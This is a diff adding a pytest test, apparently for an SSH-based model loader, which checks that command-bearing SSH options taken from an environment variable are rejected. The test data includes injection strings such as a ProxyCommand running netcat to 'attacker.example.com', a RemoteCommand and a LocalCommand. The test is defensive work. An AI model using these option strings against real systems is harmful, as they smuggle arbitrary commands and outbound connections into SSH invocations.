@@ -129,6 +129,31 @@ def test_target_client_factory_rejects_positional_ssh_opts(
         _target_client_for_config()(target)
 
 
+@pytest.mark.parametrize(
+    "ssh_opts",
+    [
+        "-o ProxyCommand='nc attacker.example.com 22'",
+        "-oProxyCommand='nc attacker.example.com 22'",
+        "-o RemoteCommand=whoami",
+        "-o PermitLocalCommand=yes -o LocalCommand='touch /tmp/vllm-loader-owned'",
+    ],
+)
+def test_target_client_factory_rejects_command_bearing_ssh_options(
+    monkeypatch: pytest.MonkeyPatch,
+    ssh_opts: str,
+) -> None:
+    monkeypatch.setenv("VLLM_LOADER_SSH_OPTS", ssh_opts)
+    target = TargetConfig(
+        name="blackbird",
+        transport=TransportKind.SSH,
+        host="bgconley@10.25.0.51",
+        ssh_opts_env="VLLM_LOADER_SSH_OPTS",
+    )
+
+    with pytest.raises(ValueError, match="command-bearing SSH option"):
+        _target_client_for_config()(target)
+
+
 def test_target_client_factory_accepts_concatenated_safe_ssh_opts(
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
